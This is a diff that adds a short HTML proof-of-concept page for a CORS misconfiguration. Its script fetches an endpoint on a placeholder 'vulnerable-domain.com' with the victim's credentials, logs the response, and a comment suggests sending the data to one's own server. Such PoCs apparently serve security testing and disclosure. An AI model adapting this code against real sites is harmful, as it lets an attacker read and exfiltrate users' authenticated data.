@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS PoC</title>
+</head>
+<body>
+  <h1>CORS Misconfiguration PoC</h1>
+  <script>
+    fetch('https://vulnerable-domain.com/endpoint', {
+      credentials: 'include'
+    })
+    .then(response => response.text())
+    .then(data => {
+      console.log('Response:', data);
+      // Optionally, send data to your server
+    })
+    .catch(error => console.error('Error:', error));
+  </script>
+</body>
+</html>
